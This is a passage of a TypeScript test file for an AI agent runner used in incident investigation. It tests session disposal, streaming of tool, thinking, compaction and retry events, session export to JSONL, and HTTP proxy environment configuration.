
  // -----------------------------------------------------------------------
  // dispose
  // -----------------------------------------------------------------------

  describe("dispose", () => {
    it("should abort all active sessions", async () => {
      const session1 = createMockSession();
      const session2 = createMockSession();
      session1.prompt.mockImplementation(() => new Promise(() => {}));
      session2.prompt.mockImplementation(() => new Promise(() => {}));

      // Start two executions
      mockSession = session1;
      runner.execute(makeExecuteParams({ incidentId: "inc-d1" }));
      await waitForCondition(() => runner.hasActiveSession("inc-d1"));

      mockSession = session2;
      runner.execute(makeExecuteParams({ incidentId: "inc-d2" }));
      await waitForCondition(() => runner.hasActiveSession("inc-d2"));

      await runner.dispose();

      expect(session1.abort).toHaveBeenCalled();
      expect(session2.abort).toHaveBeenCalled();
      expect(runner.hasActiveSession("inc-d1")).toBe(false);
      expect(runner.hasActiveSession("inc-d2")).toBe(false);
    });
  });

  // -----------------------------------------------------------------------
  // Event streaming
  // -----------------------------------------------------------------------

  describe("event streaming", () => {
    it("should format tool execution summary with args and output", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "tool_execution_start",
            toolCallId: "tc-1",
            toolName: "ssh_execute_command",
            args: { command: "uptime" },
          });
          sub({
            type: "tool_execution_update",
            toolCallId: "tc-1",
            toolName: "ssh_execute_command",
            args: { command: "uptime" },
            partialResult: {
              content: [{ type: "text", text: "partial output" }],
            },
          });
          sub({
            type: "tool_execution_end",
            toolCallId: "tc-1",
            toolName: "ssh_execute_command",
            result: {
              content: [{ type: "text", text: "final output" }],
            },
            isError: false,
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("🛠️ Running: ssh_execute_command");
      expect(output).toContain("✅ Ran: ssh_execute_command");
      expect(output).toContain("Args:");
      expect(output).toContain("\"command\": \"uptime\"");
      expect(output).toContain("Output:");
      expect(output).toContain("partial output");
      expect(output).toContain("final output");
    });

    it("should format tool_execution_end error events", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "tool_execution_start", toolCallId: "tc-2", toolName: "ssh_execute_command", args: {} });
          sub({ type: "tool_execution_end", toolCallId: "tc-2", toolName: "ssh_execute_command", result: {}, isError: true });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("❌ Failed: ssh_execute_command");
    });

    it("should emit thinking content to execution log", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "message_update",
            message: {},
            assistantMessageEvent: {
              type: "thinking_start",
              contentIndex: 0,
              partial: {},
            },
          });
          sub({
            type: "message_update",
            message: {},
            assistantMessageEvent: {
              type: "thinking_delta",
              contentIndex: 0,
              delta: "Investigating CPU spike",
              partial: {},
            },
          });
          sub({
            type: "message_update",
            message: {},
            assistantMessageEvent: {
              type: "thinking_end",
              contentIndex: 0,
              content: "Investigating CPU spike",
              partial: {},
            },
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("🤔 Investigating CPU spike");
    });

    it("should stream compaction_start and compaction_end events", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "compaction_start", reason: "threshold" });
          sub({ type: "compaction_end", reason: "threshold", aborted: false, willRetry: false });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("Compacting context");
      expect(output).toContain("threshold");
      expect(output).toContain("compaction complete");
    });

    it("should stream compaction_end with aborted status", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "compaction_start", reason: "overflow" });
          sub({ type: "compaction_end", reason: "overflow", aborted: true, willRetry: false });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("compaction aborted");
    });

    it("should include error message and willRetry in compaction_end when aborted", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "compaction_end",
            reason: "overflow",
            aborted: true,
            willRetry: true,
            errorMessage: "token limit exceeded",
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("compaction aborted");
      expect(output).toContain("token limit exceeded");
      expect(output).toContain("will retry");
    });

    it("should stream auto_retry_start events", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "auto_retry_start",
            attempt: 2,
            maxAttempts: 3,
            delayMs: 1000,
            errorMessage: "server_error",
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("Retrying");
      expect(output).toContain("attempt 2/3");
      expect(output).toContain("server_error");
    });

    it("should stream auto_retry_end failure events with attempt count", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "auto_retry_end",
            success: false,
            attempt: 3,
            finalError: "API quota exceeded",
          });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).toContain("retries exhausted");
      expect(output).toContain("3 attempts");
      expect(output).toContain("API quota exceeded");
    });

    it("should not emit output for successful auto_retry_end", async () => {
      const onOutput = vi.fn();
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({ type: "auto_retry_end", success: true, attempt: 2 });
        }
      });

      await runner.execute(makeExecuteParams({ onOutput }));

      const output = onOutput.mock.calls.map((call: any[]) => call[0]).join("");
      expect(output).not.toContain("retries exhausted");
    });

    it("should accumulate tokens from turn_end events", async () => {
      mockSession.prompt.mockImplementationOnce(async () => {
        for (const sub of mockSession._subscribers) {
          sub({
            type: "turn_end",
            message: { role: "assistant", usage: { totalTokens: 500 } },
            toolResults: [],
          });
          sub({
            type: "turn_end",
            message: { role: "assistant", usage: { totalTokens: 300 } },
            toolResults: [],
          });
        }
      });

      const result = await runner.execute(makeExecuteParams());

      expect(result.tokens_used).toBe(800);
    });
  });

  // -----------------------------------------------------------------------
  // Session export
  // -----------------------------------------------------------------------

  describe("session export", () => {
    it("should export session JSONL to workDir/session_export.jsonl on success", async () => {
      const fs = await import("node:fs");
      const path = await import("node:path");
      const tmpDir = fs.mkdtempSync(path.join("/tmp", "agent-export-"));

      // Create a fake session file that getSessionFile will point to
      const fakeSessionFile = path.join(tmpDir, "session.jsonl");
      fs.writeFileSync(fakeSessionFile, '{"type":"header","id":"h1"}\n{"type":"message","role":"user","content":"test"}\n');

      // Make SessionManager.create return a mock with getSessionFile pointing to fake file
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      (SessionManager.create as any).mockReturnValueOnce({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => fakeSessionFile),
      });

      const result = await runner.execute(makeExecuteParams({ workDir: tmpDir }));

      const expectedExportPath = path.join(tmpDir, "session_export.jsonl");
      expect(result.session_export).toBe(expectedExportPath);
      expect(fs.existsSync(expectedExportPath)).toBe(true);

      const exportedContent = fs.readFileSync(expectedExportPath, "utf-8");
      expect(exportedContent).toContain('"type":"header"');
      expect(exportedContent).toContain('"type":"message"');

      // Cleanup
      fs.rmSync(tmpDir, { recursive: true });
    });

    it("should export session JSONL even on execution error", async () => {
      const fs = await import("node:fs");
      const path = await import("node:path");
      const tmpDir = fs.mkdtempSync(path.join("/tmp", "agent-export-err-"));

      const fakeSessionFile = path.join(tmpDir, "session.jsonl");
      fs.writeFileSync(fakeSessionFile, '{"type":"header","id":"h1"}\n');

      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      (SessionManager.create as any).mockReturnValueOnce({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => fakeSessionFile),
      });

      mockSession.prompt.mockRejectedValueOnce(new Error("API error"));

      const result = await runner.execute(makeExecuteParams({ workDir: tmpDir }));

      expect(result.error).toBe("API error");
      const expectedExportPath = path.join(tmpDir, "session_export.jsonl");
      expect(result.session_export).toBe(expectedExportPath);
      expect(fs.existsSync(expectedExportPath)).toBe(true);

      fs.rmSync(tmpDir, { recursive: true });
    });

    it("should return undefined session_export when no session file exists", async () => {
      const result = await runner.execute(makeExecuteParams());

      // Default mock returns undefined for getSessionFile
      expect(result.session_export).toBeUndefined();
    });

    it("should not fail execution when session export fails", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      (SessionManager.create as any).mockReturnValueOnce({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        // Point to a non-existent file — copyFileSync will throw
        getSessionFile: vi.fn(() => "/nonexistent/path/session.jsonl"),
      });

      const result = await runner.execute(makeExecuteParams());

      // Execution should still succeed
      expect(result.session_id).toBe("mock-session-123");
      expect(result.response).toBe("Analysis complete.");
      expect(result.session_export).toBeUndefined();
      expect(result.error).toBeUndefined();
    });
  });

  // -----------------------------------------------------------------------
  // Proxy configuration
  // -----------------------------------------------------------------------

  describe("proxy configuration", () => {
    it("should set env vars and undici EnvHttpProxyAgent when llm_enabled is true", async () => {
      const proxyConfig: ProxyConfig = {
        url: "http://proxy.example.com:8080",
        no_proxy: "localhost,127.0.0.1",
        llm_enabled: true,
        slack_enabled: false,
        zabbix_enabled: false,
        victoria_metrics_enabled: false,
      };

      let capturedHttpProxy: string | undefined;
      let capturedHttpsProxy: string | undefined;
      let capturedNoProxy: string | undefined;
      let capturedDispatcher: string | undefined;

      // Capture env vars and dispatcher during session creation
      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        capturedHttpProxy = process.env.HTTP_PROXY;
        capturedHttpsProxy = process.env.HTTPS_PROXY;
        capturedNoProxy = process.env.NO_PROXY;
        const undici = await import("undici");
        capturedDispatcher = undici.getGlobalDispatcher()?.constructor?.name;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig }));

      expect(capturedHttpProxy).toBe("http://proxy.example.com:8080");
      expect(capturedHttpsProxy).toBe("http://proxy.example.com:8080");
      expect(capturedNoProxy).toBe("localhost,127.0.0.1");
      expect(capturedDispatcher).toBe("EnvHttpProxyAgent");
    });

    it("should NOT set proxy when llm_enabled is false", async () => {
      const proxyConfig: ProxyConfig = {
        url: "http://proxy.example.com:8080",
        no_proxy: "",
        llm_enabled: false,
        slack_enabled: true,
        zabbix_enabled: true,
        victoria_metrics_enabled: false,
      };

      let capturedHttpProxy: string | undefined;
      let capturedDispatcher: string | undefined;

      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        capturedHttpProxy = process.env.HTTP_PROXY;
        const undici = await import("undici");
        capturedDispatcher = undici.getGlobalDispatcher()?.constructor?.name;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig }));

      expect(capturedHttpProxy).toBe("");
      expect(capturedDispatcher).toBe("Agent");
    });

    it("should restore container env (empty in test) and reset dispatcher when no proxy config provided", async () => {
      // Set some stale proxy vars first
      process.env.HTTP_PROXY = "http://old-proxy:1234";
      process.env.HTTPS_PROXY = "http://old-proxy:1234";

      let capturedHttpProxy: string | undefined;
      let capturedDispatcher: string | undefined;

      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        capturedHttpProxy = process.env.HTTP_PROXY;
        const undici = await import("undici");
        capturedDispatcher = undici.getGlobalDispatcher()?.constructor?.name;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig: undefined }));

      // proxy.ts snapshots HTTP_PROXY at module load. In the test process the
      // env is unset at load time, so the snapshot is "" and applyProxyConfig
      // restores that here — i.e. the stale value set above is discarded.
      expect(capturedHttpProxy).toBe("");
      expect(capturedDispatcher).toBe("Agent");
    });

    it("should sync both upper- and lower-case env vars so undici sees a consistent value", async () => {
      // Regression: undici's EnvHttpProxyAgent uses `??` (not `||`) when
      // reading env, so a lowercase empty string would silently shadow a
      // populated uppercase env var. proxy.ts must keep both case variants in
      // lock-step on every applyProxyConfig call.
      const proxyConfig: ProxyConfig = {
        url: "http://proxy.example.com:8080",
        no_proxy: "localhost,127.0.0.1",
        llm_enabled: true,
        slack_enabled: false,
        zabbix_enabled: false,
        victoria_metrics_enabled: false,
      };

      // Simulate the compose-injected lowercase empty defaults before the run
      process.env.http_proxy = "";
      process.env.https_proxy = "";
      process.env.no_proxy = "";

      const captured: Record<string, string | undefined> = {};
      const { createAgentSession } = await import("@earendil-works/pi-coding-agent");
      (createAgentSession as any).mockImplementationOnce(async () => {
        captured.HTTP_PROXY = process.env.HTTP_PROXY;
        captured.HTTPS_PROXY = process.env.HTTPS_PROXY;
        captured.NO_PROXY = process.env.NO_PROXY;
        captured.http_proxy = process.env.http_proxy;
        captured.https_proxy = process.env.https_proxy;
        captured.no_proxy = process.env.no_proxy;
        return { session: mockSession, extensionsResult: {} };
      });

      await runner.execute(makeExecuteParams({ proxyConfig }));

      expect(captured.HTTP_PROXY).toBe("http://proxy.example.com:8080");
      expect(captured.http_proxy).toBe("http://proxy.example.com:8080");
      expect(captured.HTTPS_PROXY).toBe("http://proxy.example.com:8080");
      expect(captured.https_proxy).toBe("http://proxy.example.com:8080");
      expect(captured.NO_PROXY).toBe("localhost,127.0.0.1");
      expect(captured.no_proxy).toBe("localhost,127.0.0.1");
    });

  });
});
